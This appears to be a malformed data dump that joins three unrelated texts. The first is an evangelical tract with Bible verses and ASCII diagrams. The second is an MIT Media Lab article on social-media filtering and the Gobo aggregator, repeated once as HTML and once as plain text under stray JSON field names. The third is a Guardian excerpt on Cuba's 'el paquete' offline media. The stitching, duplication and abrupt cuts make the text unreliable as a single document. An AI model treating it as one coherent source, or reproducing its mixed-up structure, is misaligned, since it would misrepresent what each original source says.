Our Place&#34;But God demonstrates His own love toward us, in that while we were yet sinners, Christ died for us&#34; (Romans 5:8).He Rose From the Dead&#34;Christ died for our sins...He was buried...He was raised on the third day, according to the Scriptures...He appeared to Peter, then to the twelve. After that He appeared to more than five hundred...&#34; (1 Corinthians 15:3-6).He is the Only Way to God&#34;Jesus said to him, 'I am the way, the truth, and the life; no one comes to the Father, but through Me'&#34; (John 14:6).                         \\                          /&#10;                          \\ GOD       ---          /&#10;                           ----------|   |--------&#10;                              |   ___| J |___&#10;                              |  |           |&#10;                              |  |___  E  ___|&#10;                              |      |   |&#10;                             \\|/     | S |&#10;                              |      |   |&#10;                              |      | U |&#10;                              |      |   |&#10;                              |      | S |&#10;                             \\|/     |   |&#10;                           ----------|   |--------&#10;                          / MAN       ---         \\&#10;                         /                         \\&#10;This diagram illustrates that God has bridged the gulf which separates us from Him by sending His Son, Jesus Christ, to die on the cross in our place to pay the penalty for our sins.It is not enough just to know these three laws...Law FourWe must individually RECEIVE Jesus Christ as Savior and Lord; then we can know and experience God's love and plan for our lives.We Must Receive Christ&#34;But as many as received Him, to them He gave the right to become children of God, even to those who believe in his name&#34; (John 1:12)We Receive Christ Through Faith&#34;For by grace you have been saved through faith; and that not of yourselves, it is the gift of God; not as a result of works, that no one should boast&#34; (Ephesians 2:8,9).When We Receive Christ, We Experience a New Birth(Read John 3:1-8.)We Receive Christ by Personal Invitation(Christ speaking) &#34;Behold, I stand at the door and knock; if any one hears My voice and opens the door, I will come in to him&#34; (Revelation 3:20).Receiving Christ involves turning to God from self (repentance) and trusting Christ to come into our lives to forgive our sins and to make us the kinds of people He wants us to be. Just to agree intellectually that Jesus Christ is the Son of God and that He died on the cross for our sins is not enough. Nor is it enough to have an emotional experience. We receive Jesus Christ by faith, as an act of the will.These two squares represent two kinds of lives:           -------------------------          -------------------------&#10;          |          @              |        | @                    @  |&#10;          |       \\             @   |        |  \\   \\   |          /   |&#10;          |        |                |        |   \\   | -|-        /    |&#10;          |        |        @       |        |       |  |              |&#10;          |   @    | self           |        |       |  |              |&#10;       |  |        |_____           |        | @&lt;--  |-----      --&gt;@  |&#10;      -|- |        |     |      @   |        |       |     |           |&#10;       |  |        |     |          |        |       |     |           |&#10;       |  |        |     |          |        |       |     | self      |&#10;          |       /       \\         |        |      /   |   \\     \\    |&#10;          |              @          |        |          |          \\   |&#10;          |   @                     |        |          O           O  |&#10;           -------------------------          -------------------------&#10;              SELF-DIRECTED LIFE                 CHRIST-DIRECTED LIFE&#10;            Self is on the throne               Christ is on the throne&#10;           Christ is outside the life         Self is yielding to Christ&#10;      @ Interests are directed by self,    @ Interests directed by Christ&#10;        often resulting in discord and         resulting in harmony with&#10;                frustration.

Would you like to thank God in prayer right now for what he has done for you? By thanking God, you demonstrate your faith.To enjoy your new life to the fullest...Suggestions For Christian GrowthSpiritual growth results from trusting Jesus Christ. &#34;The righteous man shall live by faith&#34; (Galatians 3:11). A life of faith will enable you to trust God increasingly with every detail of your life, and to practice the following:Go to God in prayer daily (John 15:7).Read God's Word daily (Acts 17:11)-begin with the Gospel of John.Obey God moment by moment (John 14:21).Witness for Christ by your life and words (Matthew 4:19; John 15:8).Trust God for every detail of your life (1 Peter 5:7).Holy Spirit-allow Him to control and empower your daily life and witness (Galatians 5:16,17; Acts 1:8).",

			"body": "<h1 id=\"reader-title\">Who Filters Your News? Why we built gobo.social – MIT MEDIA LAB<br/></h1>      <div id=\"reader-credits\" class=\"credits\">Ethan Zuckerman</div>        <div class=\"content\">            <div id=\"moz-reader-content\" class=\"line-height4\"><div id=\"readability-page-1\" class=\"page\"><div class=\"section-inner sectionLayout--insetColumn\"><p id=\"6827\" class=\"graf graf--p graf-after--h3\">Roughly ten years ago, as phones became smartphones and Facebook and Twitter began their rise towards ubiquity, a fundamental social shift took place: the majority of people in the developed world became content creators. The bloggers of the early 2000s were joined by hundreds of millions of people posting videos to YouTube channels, pictures to Instagram, essays to Medium and countless status updates from 140 characters to Facebook wall posts. Before the internet, publishing had been a distinction, with a limited number of people lucky, talented or wealthy enough to share ideas or images with a wide audience. After the rise of social media, publishing became a default, with non-participation the exception.</p><p id=\"e1d4\" class=\"graf graf--p graf-after--p\">There’s a problem with this rise in shared self-expression: we’ve all still got a constant and limited amount of attention available. For those creating content, this means the challenge now is not publishing your work, but finding an audience. The problem for those of us in the audience — i.e., all of us — is filtering through the information constantly coming at us.</p><figure id=\"f5e1\" class=\"graf graf--figure graf-after--p\"></figure><p id=\"9e73\" class=\"graf graf--p graf-after--figure\">Before the internet, we relied on newspapers and broadcasters to filter much of our information, choosing curators based on their styles, reputations and biases — did you want a Wall Street Journal or New York Times view of the world? Fox News or NPR? The rise of powerful search engines made it possible to filter information based on our own interests — if you’re interested in sumo wrestling, you can learn whatever Google will show you, even if professional curators don’t see the sport as a priority.</p><p id=\"658c\" class=\"graf graf--p graf-after--p\">Social media has presented a new problem for filters. The theory behind social media is that we want to pay attention to what our friends and family think is important. In practice, paying attention to everything 500 or 1500 friends are interested in is overwhelming — <a href=\"https://www.newyorker.com/science/maria-konnikova/social-media-affect-math-dunbar-number-friendships\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">Robin Dunbar theorizes</a> that people have a hard limit to how many relationships we can cognitively maintain. Twitter solves this problem with a social hack: it’s okay to miss posts on your feed because so many are flowing by… though Twitter now tries to catch you up on important posts if you had the temerity to step away from the service for a few hours.</p><p id=\"236a\" class=\"graf graf--p graf-after--p\">Facebook and other social media platforms solve the problem a different way: the algorithm. Facebook’s news feed usually differs sharply from a list of the most recent items posted by your friends and pages you follow — instead, it’s been personalized using thousands of factors, meaning you’ll see posts Facebook thinks you’ll want to see from hours or days ago, while you’ll miss some recent posts the algorithm thinks won’t interest you. Research from the labs of Christian Sandvig and Karrie Karahalios suggests that <a href=\"http://www-personal.umich.edu/%7Ecsandvig/research/Eslami_Algorithms_CHI15.pdf\" class=\"markup--anchor markup--p-anchor\" rel=\"noopener nofollow\" target=\"_blank\">even heavy Facebook users aren’t aware that algorithms shape their use of the service</a>, and that many have experienced anxiety about not receiving responses to posts the algorithm suppressed.</p><p id=\"c948\" class=\"graf graf--p graf-after--p\">Many of the anxieties about Facebook and other social platforms are really anxieties about filtering. The filter bubble, posited by Eli Pariser, is the idea that our natural tendencies towards homophily get amplified by filters designed to give us what we want, not ideas that challenge us, leading to ideological isolation and polarization. Fake news designed to mislead audiences and garner ad views relies on the fact that Facebook’s algorithms have a difficult time determining whether information is true or not, but can easily see whether information is new and popular, sharing information that’s received strong reactions from previous audiences. When <a href=\"https://www.recode.net/2017/10/30/16571598/read-full-testimony-facebook-twitter-google-congress-russia-election-fake-news\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">Congress demands action on fake news</a> and Kremlin propaganda, they’re requesting another form of filtering, based on who’s creating content and on whether it’s factually accurate.</p><figure id=\"9272\" class=\"graf graf--figure graf--iframe graf-after--p\"></figure><p id=\"1f98\" class=\"graf graf--p graf-after--figure\"><a href=\"http://www.motherjones.com/politics/2017/04/what-twitter-going-do-about-disinformation-campaigns/\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">Twitter’s problems with trolls, bots, extremists and harassment</a> are filtering problems as well. <a href=\"https://www.theguardian.com/commentisfree/2017/jan/03/ive-left-twitter-unusable-anyone-but-trolls-robots-dictators-lindy-west\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">Prominent users like Lindy West have left the system</a> complaining that Twitter is unwilling to remove serial abusers from the platform, or to give people abused on the service stronger tools to filter out and report abuse. As questions arise about Russian influence on the platform, Twitter may need to aggressively identify and filter out automated accounts which are used to promote pro-Trump or pro-Kremlin hashtags — the <a href=\"http://dashboard.securingdemocracy.org/\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">Hamilton68 Project</a> focuses on tracking these accounts and understanding their influence as Twitter since the service has not yet filtered them out, either banning them or allowing audiences to block them from their feed.</p><p id=\"43cd\" class=\"graf graf--p graf-after--p\">Why don’t social media platforms like Facebook and Twitter give users powerful tools to filter their own feeds? Right now, the algorithms control what we see, but we can’t control them. As the internet maxim goes, <a href=\"https://lifehacker.com/5697167/if-youre-not-paying-for-it-youre-the-product\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">“If you’re not paying for something, you’re not the customer; you’re the product being sold”.</a> Both Twitter and Facebook offer powerful filtering tools that allow advertisers to target exactly who they want their ads to reach. You can pay money and advertise to women of color between 40–60 in Seattle, but you can’t choose to read perspectives from those women. While we’ve seen great innovation from projects like <a href=\"https://twitter.com/blocktogether\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">BlockTogether</a>, which lets users who experience harassment share Twitter blocklists, we’ve seen surprisingly little innovation on user-controllable filters from the platforms themselves. And unless we see something like <a href=\"https://www.theatlantic.com/technology/archive/2017/05/the-case-for-a-taxpayer-supported-version-of-facebook/524037/\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">public-service social media platforms</a>, it’s unlikely that we will see platforms give users much more control over what they see.</p><p id=\"b387\" class=\"graf graf--p graf-after--p\">Algorithmic filters optimize platforms for user retention and engagement, keeping our eyes firmly on the site so that our attention can be sold to advertisers. We thought it was time that we all had a tool that let us filter social media the ways we choose. What if we could choose to challenge ourselves one day, encountering perspectives from outside our normal orbits, and relax another day, filtering for what’s funniest and most viral. So we built <a href=\"https://gobo.social/\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">Gobo</a>.</p><p id=\"d1ad\" class=\"graf graf--p graf-after--p\"><strong class=\"markup--strong markup--p-strong\">What’s Gobo?</strong></p><p id=\"2fa2\" class=\"graf graf--p graf-after--p\"><a href=\"https://gobo.social/\" class=\"markup--anchor markup--p-anchor\" rel=\"nofollow noopener\" target=\"_blank\">Gobo</a> is a social media aggregator with filters you control. You can use Gobo to control what’s edited out of your feed, or configure it to include news and points of view from outside your usual orbit.

Gobo retrieves recent posts from these social networks and lets you decide which ones you want to see. Want more posts from women? Adjust a slider to set the gender balance of your feed… or just click on the “mute all men” button and listen to the folks who often get shouted down in online dialogs.

			"body_p": "Who Filters Your News? Why we built gobo.social – MIT MEDIA LAB      Ethan Zuckerman                    Roughly ten years ago, as phones became smartphones and Facebook and Twitter began their rise towards ubiquity, a fundamental social shift took place: the majority of people in the developed world became content creators. The bloggers of the early 2000s were joined by hundreds of millions of people posting videos to YouTube channels, pictures to Instagram, essays to Medium and countless status updates from 140 characters to Facebook wall posts. Before the internet, publishing had been a distinction, with a limited number of people lucky, talented or wealthy enough to share ideas or images with a wide audience. After the rise of social media, publishing became a default, with non-participation the exception.There’s a problem with this rise in shared self-expression: we’ve all still got a constant and limited amount of attention available. For those creating content, this means the challenge now is not publishing your work, but finding an audience. The problem for those of us in the audience — i.e., all of us — is filtering through the information constantly coming at us.Before the internet, we relied on newspapers and broadcasters to filter much of our information, choosing curators based on their styles, reputations and biases — did you want a Wall Street Journal or New York Times view of the world? Fox News or NPR? The rise of powerful search engines made it possible to filter information based on our own interests — if you’re interested in sumo wrestling, you can learn whatever Google will show you, even if professional curators don’t see the sport as a priority.Social media has presented a new problem for filters. The theory behind social media is that we want to pay attention to what our friends and family think is important. In practice, paying attention to everything 500 or 1500 friends are interested in is overwhelming — Robin Dunbar theorizes that people have a hard limit to how many relationships we can cognitively maintain. Twitter solves this problem with a social hack: it’s okay to miss posts on your feed because so many are flowing by… though Twitter now tries to catch you up on important posts if you had the temerity to step away from the service for a few hours.Facebook and other social media platforms solve the problem a different way: the algorithm. Facebook’s news feed usually differs sharply from a list of the most recent items posted by your friends and pages you follow — instead, it’s been personalized using thousands of factors, meaning you’ll see posts Facebook thinks you’ll want to see from hours or days ago, while you’ll miss some recent posts the algorithm thinks won’t interest you. Research from the labs of Christian Sandvig and Karrie Karahalios suggests that even heavy Facebook users aren’t aware that algorithms shape their use of the service, and that many have experienced anxiety about not receiving responses to posts the algorithm suppressed.Many of the anxieties about Facebook and other social platforms are really anxieties about filtering. The filter bubble, posited by Eli Pariser, is the idea that our natural tendencies towards homophily get amplified by filters designed to give us what we want, not ideas that challenge us, leading to ideological isolation and polarization. Fake news designed to mislead audiences and garner ad views relies on the fact that Facebook’s algorithms have a difficult time determining whether information is true or not, but can easily see whether information is new and popular, sharing information that’s received strong reactions from previous audiences. When Congress demands action on fake news and Kremlin propaganda, they’re requesting another form of filtering, based on who’s creating content and on whether it’s factually accurate.Twitter’s problems with trolls, bots, extremists and harassment are filtering problems as well. Prominent users like Lindy West have left the system complaining that Twitter is unwilling to remove serial abusers from the platform, or to give people abused on the service stronger tools to filter out and report abuse. As questions arise about Russian influence on the platform, Twitter may need to aggressively identify and filter out automated accounts which are used to promote pro-Trump or pro-Kremlin hashtags — the Hamilton68 Project focuses on tracking these accounts and understanding their influence as Twitter since the service has not yet filtered them out, either banning them or allowing audiences to block them from their feed.Why don’t social media platforms like Facebook and Twitter give users powerful tools to filter their own feeds? Right now, the algorithms control what we see, but we can’t control them. As the internet maxim goes, “If you’re not paying for something, you’re not the customer; you’re the product being sold”. Both Twitter and Facebook offer powerful filtering tools that allow advertisers to target exactly who they want their ads to reach. You can pay money and advertise to women of color between 40–60 in Seattle, but you can’t choose to read perspectives from those women. While we’ve seen great innovation from projects like BlockTogether, which lets users who experience harassment share Twitter blocklists, we’ve seen surprisingly little innovation on user-controllable filters from the platforms themselves. And unless we see something like public-service social media platforms, it’s unlikely that we will see platforms give users much more control over what they see.Algorithmic filters optimize platforms for user retention and engagement, keeping our eyes firmly on the site so that our attention can be sold to advertisers. We thought it was time that we all had a tool that let us filter social media the ways we choose. What if we could choose to challenge ourselves one day, encountering perspectives from outside our normal orbits, and relax another day, filtering for what’s funniest and most viral. So we built Gobo.What’s Gobo?Gobo is a social media aggregator with filters you control. You can use Gobo to control what’s edited out of your feed, or configure it to include news and points of view from outside your usual orbit. Gobo aims to be completely transparent, showing you why each post was included in your feed and inviting you to explore what was filtered out by your current filter settings.To use Gobo, you link your Twitter and Facebook accounts to Gobo and choose a set of news publications that most closely resembles the news you follow online. Gobo retrieves recent posts from these social networks and lets you decide which ones you want to see. Want more posts from women? Adjust a slider to set the gender balance of your feed… or just click on the “mute all men” button and listen to the folks who often get shouted down in online dialogs.

But if you can’t get to the internet, there are ways of bringing it physically to you.\nIt’s known as “el paquete semanal” or “the weekly packet”, an \nexternal drive loaded with thousands of hours of media content that is \ndelivered to customers by enterprising ‘suppliers’ like Alberto Jorge.\n“With el paquete you choose what to watch and when to watch it,” says\n Jorge, 34, as he walks the cracked paving slabs of west Havana \ndelivering the drives.\n\nDubbed Cuba’s version of Netflix, it’s a form of offline internet that \nsidesteps censorship in state media, and connectivity issues, that are \ndue in part to the US embargo.\n\nThis week’s edition features showbiz news from Spain, Big Brother \nfrom the US, and an episode of Celebrity Masterchef broadcast just days \nearlier on BBC One.\nAlberto hands a one-terabyte drive to each household to copy, before \nreturning the next day to collect it. He charges the equivalent of two \nUS dollars a week for the service.\nUpon connecting the hard disk, subscribers are presented with more \nthan 50 folders. There are Spanish-language editions of magazines such \nas Forbes and GQ, scanned in pdf format, apps that users can copy to \ntheir phones, and a file giving offline access to “Revolico”, the \nisland’s main classified website which is intermittently blocked online.\nWhile tolerated by the authorities, it is unclear who heads up this \nhazy enterprise. Rumour has it that a network of entrepreneurs pay \ndatabase administrators to download content using fast internet \nconnections in their state jobs.\nOn the other side of Havana, Elena Llera, 52, plugs a memory stick \nwith The Bride of Istanbul, a Turkish soap opera, into her television. \nEl paquete is now her main source of home entertainment, and she only \nswitches to state TV for the evening news.\nDespite having a public wifi park just 100 metres from her apartment –\n one of more than 700 to have opened since 2015 – she connects only \ntwice a week to video call her aunt in Miami. It costs the equivalent of\n one dollar an hour to use the internet, around the same as a day’s \nwage.\n“If I could, then I’d use the internet for all its functions, to \nlearn about politics and culture. But I can’t. It’s very expensive,” she\n says.\nAlejandro Pol, 28, a dentist visiting Elena’s flatmate, uses el paquete to watch Vice News and reviews of the latest iPhones.\n“We know it doesn’t work like this in the capitalist world,” he says, “but it’s a way we have of staying connected.”https://www.theguardian.com/technology/ng-interactive/2019/jan/11/the-internet-but-not-as-we-know-it-life-online-in-china-russia-cuba-and-india\n\n\n    "
